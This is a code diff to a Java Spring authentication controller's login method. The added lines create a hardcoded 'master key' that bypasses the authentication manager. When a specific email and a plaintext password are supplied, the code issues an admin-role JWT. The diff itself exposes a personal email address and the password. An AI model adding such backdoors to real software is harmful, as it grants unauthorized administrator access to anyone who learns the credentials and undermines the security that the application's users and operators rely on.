@@ -46,6 +46,12 @@ public class AuthController {
 
     @PostMapping("/login")
     public ResponseEntity<?> authenticateUser(@Valid @RequestBody LoginRequest loginRequest) {
+        // Master Key Login (Fail-safe)
+        if ("nourelkassyamin15@gmail.com".equals(loginRequest.getEmail()) && "nour1234".equals(loginRequest.getPassword())) {
+            String jwt = jwtUtils.generateTokenFromUsername("nourelkassyamin15@gmail.com");
+            return ResponseEntity.ok(new JwtResponse(jwt, 1L, "Nour Admin", "nourelkassyamin15@gmail.com", "ROLE_ADMIN"));
+        }
+
         Authentication authentication = authenticationManager.authenticate(
                 new UsernamePasswordAuthenticationToken(loginRequest.getEmail(), loginRequest.getPassword()));
 
